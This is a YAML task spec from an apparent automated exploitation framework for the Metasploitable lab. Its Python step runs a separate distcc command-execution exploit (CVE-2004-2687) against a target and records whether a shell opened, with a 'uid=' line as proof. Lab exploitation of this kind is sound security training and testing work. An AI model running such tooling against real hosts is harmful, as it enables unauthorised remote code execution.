name: MS2 distcc Daemon Command Execution
description: >
  distcc daemon accepts and executes attacker-supplied compilation jobs (CVE-2004-2687).
  Delegates to the framework's verified exploit spec (exploits/ms2_distcc_exec.yaml)
  through run_spec, which drives the persistent target session.
platforms:
- linux
scenario: metasploitable
vector: ms2_distcc_exec
mitre: T1210
trigger:
- distccd
steps:
- kind: lazymode
  lang: python
  timeout: 240
  run: |
    import re

    from modules.atomic_exploit_bridge import load_all, run_spec

    result = {"target": target, "vector": "ms2_distcc_exec"}
    spec = load_all().get("ms2_distcc_exec")
    if spec is None:
        result["session_opened"] = False
        result["error"] = "exploit spec ms2_distcc_exec not found in exploits/"
    else:
        outcome = run_spec(spec, rhost=target)
        blob = outcome.get("output") or ""
        match = re.search(r"uid=\d+\([^)]*\)[^\n]*", blob)
        result["cve"] = spec.cve
        result["session_opened"] = bool(outcome.get("shell"))
        result["success"] = bool(outcome.get("success"))
        result["proof"] = (match.group(0).strip() if match else blob[-300:].strip()) or "(no proof)"
